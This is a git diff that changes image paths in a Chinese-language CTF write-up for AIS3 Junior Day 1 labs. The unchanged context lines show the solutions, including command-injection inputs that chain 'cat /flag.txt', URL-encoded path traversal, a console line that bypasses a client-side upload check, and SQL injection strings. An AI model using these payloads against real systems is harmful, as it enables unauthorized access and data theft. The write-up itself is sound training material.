@@ -11,7 +11,7 @@ categories: [ais3-junior]
 <details>
 <summary>點我展開圖片</summary>
 
-![pic1](/img/a5-ais3-jr-Day1/Command-Injection-1_pic1.png)
+![pic1](./Command-Injection-1_pic1.png)
 
 </details>
 
@@ -20,7 +20,7 @@ categories: [ais3-junior]
 <details>
 <summary>點我展開圖片</summary>
     
-![pic2](/img/a5-ais3-jr-Day1/Command-Injection-1_pic2.png)
+![pic2](./Command-Injection-1_pic2.png)
     
 </details>
 
@@ -29,7 +29,7 @@ categories: [ais3-junior]
 <details>
 <summary>點我展開圖片</summary>
     
-![pic3](/img/a5-ais3-jr-Day1/Command-Injection-1_pic3.png)
+![pic3](./Command-Injection-1_pic3.png)
     
 </details>
 
@@ -182,7 +182,7 @@ if __name__ == "__main__":
 
 其中可以看到`FLAG_PATH = "/flag.txt"`
 
-![pic4](/img/a5-ais3-jr-Day1/Command-Injection-1_pic4.png)
+![pic4](./Command-Injection-1_pic4.png)
 
 
 ---
@@ -190,17 +190,17 @@ if __name__ == "__main__":
 # Command Injection-2
 
 `google.com && ls`
-![pic1](/img/a5-ais3-jr-Day1/Command-Injection-2_pic1.png)
+![pic1](./Command-Injection-2_pic1.png)
 
 `google.com && echo test`
-![pic2](/img/a5-ais3-jr-Day1/Command-Injection-2_pic2.png)
+![pic2](./Command-Injection-2_pic2.png)
 
 
 所以他應該是`ping {enter something}.corp.local`
 
 `google.com && cat /flag.txt && echo `
 
-![pic3](/img/a5-ais3-jr-Day1/Command-Injection-2_pic3.png)
+![pic3](./Command-Injection-2_pic3.png)
 
 
 
@@ -209,14 +209,14 @@ if __name__ == "__main__":
 # Command Injection-3
 
 `Default`代表可以修改成非default(?)
-![pic1](/img/a5-ais3-jr-Day1/Command-Injection-3_pic1.png)
+![pic1](./Command-Injection-3_pic1.png)
 
 看起來可以 
 
-![pic2](/img/a5-ais3-jr-Day1/Command-Injection-3_pic2.png)
+![pic2](./Command-Injection-3_pic2.png)
 
 `value=google.com && cat /flag.txt && echo `
-![pic3](/img/a5-ais3-jr-Day1/Command-Injection-3_pic3.png)
+![pic3](./Command-Injection-3_pic3.png)
 
 
 ---
@@ -226,13 +226,13 @@ if __name__ == "__main__":
 
 # Path Traversal
 `/flag.txt`
-![pic1](/img/a5-ais3-jr-Day1/Path-Traversal_pic1.png)
+![pic1](./Path-Traversal_pic1.png)
 
 # Path Traversal-2
 可以try出來他擋的是`/`
-![image](/img/a5-ais3-jr-Day1/Path-Traversal-2_pic1.png)
+![image](./Path-Traversal-2_pic1.png)
 `%2Fflag.txt`
-![image](/img/a5-ais3-jr-Day1/Path-Traversal-2_pic2.png)
+![image](./Path-Traversal-2_pic2.png)
 
 ---
 
@@ -244,7 +244,7 @@ if __name__ == "__main__":
 # File Upload-2
 可以看到他只是用前端listener去監聽按鈕的按下後，若檔案不符合規定就不讓他POST出去
 
-![pic1](/img/a5-ais3-jr-Day1/File-Upload-2_pic1.png)
+![pic1](./File-Upload-2_pic1.png)
 
 
 `document.getElementById('uploadForm').replaceWith(document.getElementById('uploadForm').cloneNode(true));`(將被listener監聽的element替換成沒被監聽的element)
@@ -259,12 +259,12 @@ if __name__ == "__main__":
 # SQLi-1
 `' or 1=1 --`經典的SQL injection
 註解掉匹配密碼的部分
-![pic1](/img/a5-ais3-jr-Day1/SQLi-1-pic1.png)
+![pic1](./SQLi-1-pic1.png)
 
 # SQLi-2
 `' or 1=1 --`經典的SQL injection
 一樣 差別在於它註解掉的是SELECT的行的限制
-![pic1](/img/a5-ais3-jr-Day1/SQLi-2-pic1.png)
+![pic1](./SQLi-2-pic1.png)
 
 # SQLi-3
 `' union select null,null,schema_name from information_schema.schemata --` 列出所有db的名稱`information_schema.schemata`
@@ -450,7 +450,7 @@ Try basic commands like pwd, ls, and cat.
 # Linux-2
 
 `ls`來印出現在在的目錄底下有什麼
-![pic1](/img/a5-ais3-jr-Day1/Linux-2_pic1.png)
+![pic1](./Linux-2_pic1.png)
 
 `pwd`印出現在在的目錄
 
@@ -607,19 +607,19 @@ This time, the system will not show you the directory listing first.
 `FLAG_PATH = "/flag"`
 所以`cat /flag`看看
 
-![pic2](/img/a5-ais3-jr-Day1/Linux-2_pic2.png)
+![pic2](./Linux-2_pic2.png)
 
 
 # Linux-3
 
-![pic1](/img/a5-ais3-jr-Day1/Linux-3_pic1.png)
+![pic1](./Linux-3_pic1.png)
 
 `cat`不能用
-![pic2](/img/a5-ais3-jr-Day1/Linux-3_pic2.png)
+![pic2](./Linux-3_pic2.png)
 
 `head -n 20 /flag`或`tail -n 20 /flag`
 (頭20行或尾20行)
-![pic3](/img/a5-ais3-jr-Day1/Linux-3_pic3.png)
+![pic3](./Linux-3_pic3.png)
 
 ---
 
